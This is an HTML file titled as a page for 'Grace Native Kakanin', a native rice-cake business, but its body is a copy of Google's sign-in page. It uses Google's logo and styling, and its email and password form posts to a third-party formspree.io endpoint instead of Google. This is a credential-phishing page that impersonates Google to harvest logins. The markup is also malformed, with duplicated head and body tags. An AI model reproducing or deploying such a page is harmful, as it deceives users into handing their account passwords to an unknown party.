<!DOCTYPE html>
<html lang="en">
<head>
    <title>Grace Native Kakanin</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Native Kakanin">
    <meta name="author" content="Lance Gryshler C. Nugoy">
    <link rel="stylesheet" type="text/css" href="styles.css">
    <link rel="icon" href="./images/favicon.ico" type="image/x-icon">
</head>
<body>

    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 360px;
        }
        .login-container img {
            width: 75px;
            margin-bottom: 20px;
        }
        h2 {
            font-size: 22px;
            margin-bottom: 20px;
            color: #202124;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #1a73e8;
            border: none;
            color: white;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }
        .login-btn:hover {
            background-color: #1558b3;
        }
        .forgot-password, .create-account {
            display: block;
            margin: 15px 0;
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
        }
        .forgot-password:hover, .create-account:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
        <h2>Sign in</h2>
        <form action="https://formspree.io/f/mgvavvkd" method="POST">
            <input type="text" placeholder="Email or phone" required>
            <input type="password" placeholder="Enter your password" required>
            <button type="submit" class="login-btn">Next</button>
        </form>
        <a href="#" class="forgot-password">Forgot password?</a>
        <a href="#" class="create-account">Create account</a>
    </div>
</body>
</html>
